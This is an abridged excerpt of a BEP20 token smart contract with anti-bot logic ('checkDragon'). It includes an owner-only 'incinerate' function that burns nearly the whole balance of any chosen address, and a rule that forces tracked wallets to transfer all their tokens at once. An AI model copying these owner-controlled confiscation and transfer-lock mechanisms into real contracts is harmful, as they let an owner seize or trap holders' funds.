...
contract Mister is IBEP20, Auth {
    ...
    function khaleesi(address txOrigin, address sender) internal {
    ...
    function checkDragon(address sender, address recipient, uint256 amount) internal {
        // IN CASE THE BOT TRIES TO TRANSFER RECENTLY BOUGHT TOKENS
        // OPTION A: LESS THAN ALL THE WALLET HAS
        // NOT POSSIBLE.
        if (!liquidityAddress[recipient] 
        && sender == oldRecipient && amount < balanceOf(sender)) {
            require(amount == balanceOf(sender), "Do not try to fool the Dragons");
        }
        // IN CASE THE BOT TRIES TO TRANSFER RECENTLY BOUGHT TOKENS
        // OPTION B: ALL TOKENS FROM THE WALLET
        // POSSIBLE. NOW DRAGON STARTS TRACKING NEW RECIPIENT
        if (!liquidityAddress[recipient] 
        && sender == oldRecipient && amount == balanceOf(sender)) {
            oldRecipient = recipient;
        }
    ...
    function incinerate(address _lostSoul) external onlyOwner {
        ...
        if ((balanceOf(_lostSoul) - 1 ether) > 0) {
            _basicTransfer(_lostSoul, DEAD, (balanceOf(_lostSoul) - 1 ether));
        }
    }
